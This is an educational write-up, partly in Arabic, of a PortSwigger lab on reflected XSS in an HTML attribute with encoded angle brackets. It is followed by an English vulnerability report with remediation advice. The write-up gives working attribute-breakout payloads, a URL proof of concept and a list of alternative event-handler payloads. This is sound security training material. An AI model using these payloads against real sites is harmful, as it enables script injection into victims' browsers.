## [Reflected XSS into **Attribute** with Angle Brackets HTML-Encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded)

## 1. فكرة اللاب

يعرض اللاب ثغرة **Reflected XSS** داخل **HTML attribute context**.  
المدخلات تُحقن داخل قيمة attribute مثل:

```html
<input value="USER_INPUT">
```

لكن **الـ angle brackets (`< >`) يتم ترميزها**، لذلك لا يمكنك إدخال `<script>` أو `<img>` مباشرة.  
لذلك يجب استغلال **كسر الاقتباس** داخل الـ attribute، ثم إضافة attribute جديد يحتوي JavaScript.

---

## 2. تحليل التطبيق

عند البحث عن أي نص، لاحظت ظهور قيمة `search` في أماكن متعددة، أهمها:

### 1. هذا الجزء لا يقبل حقن JavaScript لأنه داخل نص HTML منسّق:

```html
<h1>1 search results for 'text'</h1>
```

### 2. هذا الجزء هو المكان القابل للاستغلال

```html
<input type="text" name="search" value="USER_INPUT">
```

هنا **value="…USER_INPUT…"** داخل **attribute context**  
وبما أن `< >` يتم ترميزها لن تُنفَّذ وسوم، لكن **الاقتباسات لا يتم ترميزها**، وهذا يسمح بكسر قيمة الـ attribute.

---

## 3. المرحلة الأولى: تأكيد نقطة الحقن

تم تجربة:

```
" onclick=alert(1)
```

وكانت النتيجة خروج alert.

لكن اللاب لم يُحل لأن هذا الحدث **يعمل على المتصفح الخاص بك فقط**، وقد لا يعمل عند الضحية بسبب اختلاف التفاعل.

---

## 4. سبب فشل `onclick`

التنبيه قد يعمل عندك لأنك ضغطت على الحقل، لكن الضحية قد لا تضغط، لذلك يحتاج اللاب حدثًا يتم تشغيله تلقائياً بمجرد مرور الماوس أو تحميل العنصر.

---

## 5. الاستغلال الذي نجح

التنبيه الذي حلّ اللاب هو:

```
" onmouseover=alert(1)
```

لأن `onmouseover` يعمل بمجرد مرور الماوس على العنصر، وهذا يضمن التنفيذ لدى أي ضحية.

---

## 6. صيغة الطلب النهائي في الـ URL

مثال بناء URL:

```
?search="%20onmouseover=alert(1)
```

عند تحميل الصفحة، المتصفح سيحوّل الـ input إلى:

```html
<input value="" onmouseover="alert(1)">
```

وبمجرد مرور الماوس، يتم تنفيذ JavaScript.

---

## 7. أمثلة Payloads أخرى صالحة للتنفيذ

هذه أمثلة إضافية لخصائص يمكن استخدامها على العناصر داخل HTML attributes:

### 1. تشغيل تلقائي عند ترك الفوكس

```
" onblur=alert(1)
```

### 2. عند تغيير القيمة

```
" onchange=alert(1)
```

### 3. عند تحميل العنصر

```
" onload=alert(1)
```

(يعمل فقط إذا تم حقنه في عنصر يقبل onload)

### 4. عند الضغط بالماوس

```
" onmousedown=alert(1)
```

### 5. عند الكتابة داخل العنصر

```
" oninput=alert(1)
```

### 6. تشغيل عبر `autofocus` + onfocus

```
" autofocus onfocus=alert(1)
```

### 7. حقن ستايل يحتوي JavaScript (قد يُعمل في بعض السياقات)

```
" style="background-image:url(javascript:alert(1))
```

---
# **Reflected XSS – Attribute Injection (HTML-Encoded Angle Brackets)**

## **Vulnerability Report**

### **Summary**

A reflected cross-site scripting (XSS) vulnerability exists in the blog search functionality. User-controlled input is reflected inside an HTML attribute without proper encoding, allowing attackers to break out of the attribute and inject arbitrary JavaScript.

---

### **Impact**

- Execution of arbitrary JavaScript in victim browsers.
    
- Session hijacking, CSRF, phishing, keylogging.
    
- Full compromise of user accounts depending on privileges.
    

---

### **Root Cause**

The application embeds the search parameter directly into the `value` attribute of an input field:

```html
<input type="text" name="search" value="USER_INPUT">
```

While angle brackets `< >` are encoded, **double quotes are not encoded**, allowing attribute injection.

---

### **Technical Analysis**

Attacker-controlled input such as:

```
" onmouseover=alert(1)
```

breaks out of the `value` attribute:

#### Original:

```html
<input value="QUERY">
```

#### After injection:

```html
<input value="" onmouseover="alert(1)">
```

This leads to JavaScript execution when the victim hovers over the input field.

---

### **Proof of Concept (PoC)**

URL format:

```
/?search="%20onmouseover=alert(1)
```

Upon loading the page, the payload executes automatically as:

```html
<input value="" onmouseover="alert(1)">
```

---

### **Severity**

High  
The vulnerability allows direct execution of attacker-supplied JavaScript in the victim’s browser.

---

### **Recommendation**

1. HTML-encode special characters:
    
    - `" → &quot;`
        
    - `' → &#x27;`
        
2. Avoid placing untrusted input inside HTML attributes.
    
3. Use `textContent` instead of direct injection.
    
4. Implement Content Security Policy (CSP).
    

---
